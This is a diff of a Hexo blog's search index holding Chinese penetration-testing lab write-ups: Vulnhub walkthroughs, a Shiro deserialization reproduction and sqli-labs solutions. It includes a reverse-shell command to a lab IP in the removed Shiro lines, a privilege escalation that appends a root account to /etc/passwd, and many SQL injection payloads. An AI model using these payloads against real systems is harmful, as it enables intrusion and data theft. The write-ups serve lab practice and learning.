@@ -1,18 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>AoiAWD环境搭建</title>
-    <url>/posts/622384de/</url>
-    <content><![CDATA[<p>111</p>
-]]></content>
-      <categories>
-        <category>AWD</category>
-      </categories>
-      <tags>
-        <tag>AWD</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Aria2RCE漏洞复现</title>
     <url>/posts/undefined/</url>
     <content><![CDATA[<h3 id><a href="#" class="headerlink" title></a></h3><p>Aria2 是一款命令行下轻量级、多协议、多来源的下载工具（支持 HTTP/HTTPS、FTP、BitTorrent、Metalink），内建XML-RPC和JSON-RPC接口。在有权限的情况下，我们可以使用RPC接口来操作aria2来下载文件，将文件下载至任意目录，造成一个任意文件写入漏洞</p>
@@ -249,7 +237,7 @@
 <p>使用这个账户去尝试登录phpmyadmin，成功登录,并得到phpmyadmin版本为3.4.7登录后台思路一 使用phpmyadmin中账号<br><img src="/posts/827ecdf7/auth.png"><br>在anth表中得到一个账户 biLLu hEx_it使用此账户成功登录到后台</p>
 <h5 id="思路二-SQL注入再尝试查看index-php的源码"><a href="#思路二-SQL注入再尝试查看index-php的源码" class="headerlink" title="思路二 SQL注入再尝试查看index.php的源码"></a>思路二 SQL注入再尝试查看index.php的源码</h5><p><img src="/posts/827ecdf7/sqli.png"><br><code>select * from auth where pass=\&#39;&#39;.$pass=.&#39;\&#39; and uname=\&#39;&#39;.$uname.&#39;\&#39;</code><br>前面使用str_replace 将单引号全部过滤掉了，<br><code>select   from auth where pass=&#39; &#39; and uname=&#39; &#39;</code><br>输入<code>pass=admin\   uname= or 1=1 --+</code><br>即 <code>select  from auth where pass=&#39;admin\&#39; and uname=&#39; or 1=1 --+&#39;</code><br>成功登录文件上传<br><img src="/posts/827ecdf7/login.png"><br>审计一下panel.php<br>页面有两个功能 show users 和 add users 对于文件上传使用了白名单机制，只允许上传<code>jpeg,jpg,gif,png</code><br>当要上传一张图片是，会先判断后缀名是否正确，如果正确，还有一个mime验证<br><code>move_uploaded_file($_FILES[&#39;image&#39;][&#39;tmp_name&#39;], &#39;uploaded_images/&#39;.$_FILES[&#39;image&#39;][&#39;name&#39;])</code>可以看到上传图片的路径为uploaded_images/</p>
 <p>这里传马多次都没传成功，有时间再试试吧….</p>
-<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#49;&#x38;&#46;&#x31;&#52;&#x34;">&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#49;&#x38;&#46;&#x31;&#52;&#x34;</a>成功登录root用户</p>
+<h4 id="得到root权限思路二"><a href="#得到root权限思路二" class="headerlink" title="得到root权限思路二"></a>得到root权限思路二</h4><p>phpmyadmin的配置文件为<code>config.inc.php</code> 使用任意文件下载去下载改配置文件<br><img src="/posts/827ecdf7/download_phpmyconf.png"><br><img src="/posts/827ecdf7/phpmyconf.png"><br>得到一个root账户root roottoor使用ssh登录 ssh <a href="mailto:&#114;&#x6f;&#111;&#x74;&#64;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x31;&#x38;&#x2e;&#49;&#x34;&#52;">&#114;&#x6f;&#111;&#x74;&#64;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#x31;&#x38;&#x2e;&#49;&#x34;&#52;</a>成功登录root用户</p>
 <p>Reference</p>
 <blockquote>
 <p><a href="https://blog.csdn.net/weixin_52049485/article/details/112248860">https://blog.csdn.net/weixin_52049485/article/details/112248860</a><br><a href="https://www.cnblogs.com/PANDA-Mosen/p/13217674.html">https://www.cnblogs.com/PANDA-Mosen/p/13217674.html</a><br><a href="https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/">https://mengsec.com/2018/04/11/Vulnhub-billub0x-Writeup/</a></p>
@@ -260,6 +248,18 @@
       </categories>
       <tags>
         <tag>vulhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AoiAWD环境搭建</title>
+    <url>/posts/622384de/</url>
+    <content><![CDATA[<p>111</p>
+]]></content>
+      <categories>
+        <category>AWD</category>
+      </categories>
+      <tags>
+        <tag>AWD</tag>
       </tags>
   </entry>
   <entry>
@@ -306,7 +306,7 @@
 <br>
 
 <blockquote>
-<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#x6f;&#98;&#x69;&#x6e;&#64;&#100;&#105;&#103;&#105;&#46;&#110;&#105;&#110;&#106;&#97;">&#x72;&#x6f;&#98;&#x69;&#x6e;&#64;&#100;&#105;&#103;&#105;&#46;&#110;&#105;&#110;&#106;&#97;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
+<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#111;&#x62;&#105;&#110;&#64;&#100;&#105;&#103;&#105;&#x2e;&#110;&#x69;&#x6e;&#106;&#x61;">&#x72;&#111;&#x62;&#105;&#110;&#64;&#100;&#105;&#103;&#105;&#x2e;&#110;&#x69;&#x6e;&#106;&#x61;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
 <p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
 </blockquote>
 <p>使用wpscan爆破</p>
@@ -424,8 +424,8 @@
 <p>得到 <code>jim  jibril04</code></p>
 <p>连接ssh</p>
 <blockquote>
-<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#x6a;&#x69;&#109;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#56;&#x2e;&#49;&#51;&#53;">&#x6a;&#x69;&#109;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x31;&#56;&#x2e;&#49;&#51;&#53;</a></strong></p>
-<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x6a;&#x69;&#109;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#49;&#x38;&#x2e;&#x31;&#51;&#53;">&#x6a;&#x69;&#109;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#49;&#x38;&#x2e;&#x31;&#51;&#53;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
+<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#x6a;&#x69;&#x6d;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x31;&#56;&#46;&#x31;&#x33;&#x35;">&#x6a;&#x69;&#x6d;&#64;&#49;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#x31;&#56;&#46;&#x31;&#x33;&#x35;</a></strong></p>
+<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#106;&#105;&#x6d;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x31;&#56;&#46;&#x31;&#x33;&#53;">&#106;&#105;&#x6d;&#x40;&#49;&#x39;&#50;&#46;&#x31;&#x36;&#56;&#46;&#x31;&#56;&#46;&#x31;&#x33;&#53;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
 <p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
 <p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
 <p><strong>jim@dc-4:~$ pwd</strong></p>
@@ -473,7 +473,7 @@
 <p>Mamor:x:0:0:::/bin/bash</p>
 <p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
 <blockquote>
-<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#x4d;&#97;&#x6d;&#111;&#114;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#56;&#x2e;&#49;&#51;&#53;">&#x4d;&#97;&#x6d;&#111;&#114;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#56;&#x2e;&#49;&#51;&#53;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x4d;&#97;&#109;&#x6f;&#x72;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#49;&#x38;&#x2e;&#x31;&#x33;&#53;">&#x4d;&#97;&#109;&#x6f;&#x72;&#x40;&#49;&#x39;&#x32;&#46;&#49;&#54;&#56;&#x2e;&#49;&#x38;&#x2e;&#x31;&#x33;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#97;&#x6d;&#111;&#x72;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#46;&#x31;&#x38;&#x2e;&#x31;&#51;&#x35;">&#77;&#97;&#x6d;&#111;&#x72;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#56;&#46;&#x31;&#x38;&#x2e;&#x31;&#51;&#x35;</a>‘s password: </p>
+<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#97;&#x6d;&#x6f;&#114;&#64;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#49;&#x38;&#x2e;&#x31;&#51;&#53;">&#77;&#97;&#x6d;&#x6f;&#114;&#64;&#49;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#49;&#x38;&#x2e;&#x31;&#51;&#53;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#97;&#x6d;&#x6f;&#x72;&#64;&#x31;&#57;&#50;&#46;&#49;&#54;&#56;&#46;&#x31;&#x38;&#x2e;&#x31;&#51;&#53;">&#77;&#97;&#x6d;&#x6f;&#x72;&#64;&#x31;&#57;&#50;&#46;&#49;&#54;&#56;&#46;&#x31;&#x38;&#x2e;&#x31;&#51;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#x4d;&#x61;&#x6d;&#111;&#x72;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x31;&#x38;&#46;&#x31;&#51;&#x35;">&#x4d;&#x61;&#x6d;&#111;&#x72;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#x31;&#x38;&#46;&#x31;&#51;&#x35;</a>‘s password: </p>
 <p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
 </blockquote>
 <p>构造失败，重新构造一个</p>
@@ -1562,11 +1562,10 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo基本使用</title>
-    <url>/posts/d4fee3ae/</url>
-    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #生产静态网页<br><code>hexo s </code> == <code>hexo server</code> #启动服务预览<br><code>hexo d</code> == <code>hexo deploy</code> #部署<br><code>hexo clean</code> #清除缓存</p>
-<h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><p><code>hexo new post “标题”</code>  新建一篇文章  然后会在_post目录下找到新增的.md文件，用此文件来存方所习得内容编写完markdown文件后，根目录下输入<code> hexo g</code>生产静态页面。输入<code>hexo s</code>本地预览效果，<code>hexo d</code>上传至GitHub</p>
-]]></content>
+    <title>hexo文章插入图片</title>
+    <url>/posts/7ecd88c4/</url>
+    <content><![CDATA[<h3 id="本地引用-采用相对路径"><a href="#本地引用-采用相对路径" class="headerlink" title="本地引用(采用相对路径)"></a>本地引用(采用相对路径)</h3><p>在 <code>config.yml</code>文件中配置，post_asset_folder设为true，当再次新建文章时，会在source/_post中生产和文章同名的文件夹，把需要的图片资源放入该文件夹，就可以使用相对路径来引用图片.</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Hexo</category>
       </categories>
@@ -1575,10 +1574,11 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo文章插入图片</title>
-    <url>/posts/7ecd88c4/</url>
-    <content><![CDATA[<h3 id="本地引用-采用相对路径"><a href="#本地引用-采用相对路径" class="headerlink" title="本地引用(采用相对路径)"></a>本地引用(采用相对路径)</h3><p>在 <code>config.yml</code>文件中配置，post_asset_folder设为true，当再次新建文章时，会在source/_post中生产和文章同名的文件夹，把需要的图片资源放入该文件夹，就可以使用相对路径来引用图片.</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
+    <title>hexo基本使用</title>
+    <url>/posts/d4fee3ae/</url>
+    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #生产静态网页<br><code>hexo s </code> == <code>hexo server</code> #启动服务预览<br><code>hexo d</code> == <code>hexo deploy</code> #部署<br><code>hexo clean</code> #清除缓存</p>
+<h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><p><code>hexo new post “标题”</code>  新建一篇文章  然后会在_post目录下找到新增的.md文件，用此文件来存方所习得内容编写完markdown文件后，根目录下输入<code> hexo g</code>生产静态页面。输入<code>hexo s</code>本地预览效果，<code>hexo d</code>上传至GitHub</p>
+]]></content>
       <categories>
         <category>Hexo</category>
       </categories>
@@ -1604,9 +1604,9 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo设置多个标签或分类</title>
-    <url>/posts/d7c641b4/</url>
-    <content><![CDATA[<p><code>tag: [tag1,tag2,tag3]</code><br><code>categories: [categories1,categories2,categories3]</code></p>
+    <title>hexo阅读全文设置</title>
+    <url>/posts/5605128/</url>
+    <content><![CDATA[<p>使用<code>&lt; !--more--&gt;</code>标签手动截断 或者<br>文件夹下的scaffolds文件夹中的post.md中添加一行<code>description:&quot; &quot;</code> 即可在输入<code>hexo new post </code>博客标题命令新建.md文件时自动加上<code>description:&#39; &#39;</code> 在页面上显示阅读全文按钮且不带摘要。</p>
 ]]></content>
       <categories>
         <category>Hexo</category>
@@ -1616,9 +1616,9 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo阅读全文设置</title>
-    <url>/posts/5605128/</url>
-    <content><![CDATA[<p>使用<code>&lt; !--more--&gt;</code>标签手动截断 或者<br>文件夹下的scaffolds文件夹中的post.md中添加一行<code>description:&quot; &quot;</code> 即可在输入<code>hexo new post </code>博客标题命令新建.md文件时自动加上<code>description:&#39; &#39;</code> 在页面上显示阅读全文按钮且不带摘要。</p>
+    <title>hexo设置多个标签或分类</title>
+    <url>/posts/d7c641b4/</url>
+    <content><![CDATA[<p><code>tag: [tag1,tag2,tag3]</code><br><code>categories: [categories1,categories2,categories3]</code></p>
 ]]></content>
       <categories>
         <category>Hexo</category>
@@ -1782,8 +1782,8 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>shiro反序列化CVE-2016-4437复现</title>
-    <url>/posts/undefined/</url>
+    <title>shiro反序列化</title>
+    <url>/posts/abba44f/</url>
     <content><![CDATA[<h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><blockquote>
 <p>Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）<br>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。</p>
 </blockquote>
@@ -1794,29 +1794,27 @@
 
 <br>
 
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>kali : 192.168.159.129</p>
-<p>Ubuntu : 192.168.159.128</p>
-<p><code>docker-compose up -d</code> 访问<code>192.168.159.128:8080</code></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>kali : 192.168.87.128</p>
+<p>Ubuntu : 192.168.87.129</p>
+<p><code>docker-compose up -d</code> 访问<code>192.168.87.129:8080</code></p>
 <p>使用burpsuite抓包，勾选rememberme,账号密码分别为<code>admin</code>,<code>vulhub</code></p>
-<p><img src="/posts/undefined/bp1.png"></p>
+<p><img src="/posts/abba44f/bp1.png"></p>
 <p>提交表单后,可以看到set-cookie的remeberMe=deleteMe</p>
 <br>
 
-<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><code>python3 shiro_exploit.py -t 3 -u http://192.168.159.128:8080 -p &quot;touch a.txt&quot;</code></p>
-<p>python3 shiro_exploit.py -t 3 -u <a href="http://192.168.159.128:8080/">http://192.168.159.128:8080</a> -p “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1OS4xMjkvNjY2NiAwPiYx}|{base64,-d}|{bash,-i}”</p>
-<br>
-
-<p><code>bash -i &gt;&amp; /dev/tcp/192.168.159.129/6666 0&gt;&amp;1</code></p>
-<p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
-<p>加密后为 <code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1OS4xMjkvNjY2NiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
+<p><img src="/posts/abba44f/1.PNG"></p>
+<p><img src="/posts/abba44f/2.PNG"></p>
+<p>在kali上开启监听 </p>
+<p><code>nc -lvvp 6666</code></p>
+<p><img src="/posts/abba44f/3.PNG"></p>
+<p><img src="/posts/abba44f/4.PNG"></p>
+<p><img src="/posts/abba44f/shell.png"></p>
 ]]></content>
       <categories>
         <category>shiro</category>
         <category>反序列化</category>
-        <category>未完成</category>
       </categories>
       <tags>
-        <tag>未完成</tag>
         <tag>反序列化</tag>
         <tag>shiro</tag>
       </tags>
@@ -1961,6 +1959,97 @@
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs3</title>
+    <url>/posts/14bd7516/</url>
+    <content><![CDATA[<h3 id="29-参数污染"><a href="#29-参数污染" class="headerlink" title="29 参数污染"></a>29 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ... ... </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);   <span class="comment">//用`&amp;`分割字符串</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);     <span class="comment">//截取前两位字符</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)              </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;                  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用&amp;分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">explode(separator,string,limit) 函数把字符串打散为数组。</span><br><span class="line">separator 必需。规定在哪里分割字符串。</span><br><span class="line">string 必需。要分割的字符串。</span><br><span class="line">limit 可选。规定所返回的数组元素的数目。可能的值：</span><br><span class="line">    大于 0 - 返回包含最多 limit 个元素的数组</span><br><span class="line">    小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组</span><br><span class="line">    0 - 返回包含一个元素的数组</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p>对于<code>login.php?id=1&amp;id=2</code> apache(php)会解析最后一个参数，tomcat(jsp)会解析第一个参数，第一个<code>id</code>会经过<code>whitelist()</code>和<code>java_implimentation()</code></p>
+<p><code>whitelist()</code>作用是传入的参数必须是一位及以上的数字</p>
+<p><code>java_implimentation()</code>用<code>&amp;</code>分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</p>
+<p>参数污染 <code>id=1 &amp; id=0&#39; union select 1,2,&#39;3</code></p>
+<p><img src="http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93.jpg"><br>可以参考<code>https://blog.csdn.net/nzjdsds/article/details/77758824</code></p>
+<h3 id="30-参数污染"><a href="#30-参数污染" class="headerlink" title="30 参数污染"></a>30 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>和上一关差不多 双引号闭合</p>
+<p><code>?id=1&amp;id=-1&quot; union select 1,2,&quot;3</code></p>
+<p><code>?id=12&amp;id=-1&quot; union select 1,(select password from users limit 0,1),&quot;3</code></p>
+<h3 id="31-参数污染"><a href="#31-参数污染" class="headerlink" title="31 参数污染"></a>31 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>?id=12&amp;id=-1&quot;) union select 1,(select password from users limit 0,1),(&quot;3</code></p>
+<br>
+
+<h3 id="32-宽字节注入"><a href="#32-宽字节注入" class="headerlink" title="32 宽字节注入"></a>32 宽字节注入</h3><br>
+
+<p><code>?id=1%df%27%20union%20select%201,2,3%20--+</code></p>
+<p><code>?id=0%df%27%20union%20select%201,database(),3%20--+</code></p>
+<p><code>?id=0%df%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),3%20--+</code></p>
+<p>在查字段名的时候需要把<code>&#39;users&#39;</code>转成16进制，16进制的表名不需要引号 <code>0x7573657273</code></p>
+<p><code>?id=0%df%27%20union%20select%201,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273%20limit%200,1),3%20--+</code></p>
+<br>
+
+<h3 id="33-宽字节注入"><a href="#33-宽字节注入" class="headerlink" title="33 宽字节注入"></a>33 宽字节注入</h3><p>和32一模一样</p>
+<p><code>?id=1%df%27%20and%201=1%20--+</code></p>
+<br>
+
+<h3 id="34-宽字节注入-POST"><a href="#34-宽字节注入-POST" class="headerlink" title="34 宽字节注入(POST)"></a>34 宽字节注入(POST)</h3><p>过滤方式和上面的一样，可以使用burp直接传，不过POST传入数据时会进行url编码，</p>
+<p>在输入 <code>1%df or 1=1#</code>后抓包可以看到前面的<code>%df</code>变成了<code>%25df</code></p>
+<p><code>uname=1%25df%27+or+1%3D1%23&amp;passwd=aa&amp;submit=Submit</code>修改一下即可</p>
+<br>
+
+<br>
+
+<h3 id="35-宽字节注入"><a href="#35-宽字节注入" class="headerlink" title="35 宽字节注入"></a>35 宽字节注入</h3><p>和32差不多 只不过这里是字符型，不需要<code>&#39;</code>闭合</p>
+<p><code>?id=0 union select 1,database(),3</code></p>
+<br>
+
+<br>
+
+<h3 id="36-宽字节注入"><a href="#36-宽字节注入" class="headerlink" title="36 宽字节注入"></a>36 宽字节注入</h3><p>和前面一样</p>
+<p><code>?id=0%df%27%20union%20select%201,2,3--+</code></p>
+<p>?id=0%df%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)–+</p>
+<br>
+
+<h3 id="37-宽字节注入-POST"><a href="#37-宽字节注入-POST" class="headerlink" title="37 宽字节注入(POST)"></a>37 宽字节注入(POST)</h3><p>和34一样</p>
+<br>
+
+<h3 id="38-堆叠注入"><a href="#38-堆叠注入" class="headerlink" title="38 堆叠注入"></a>38 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = mysqli_store_result(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = mysqli_fetch_row(<span class="variable">$result</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">            printf(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            printf(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span 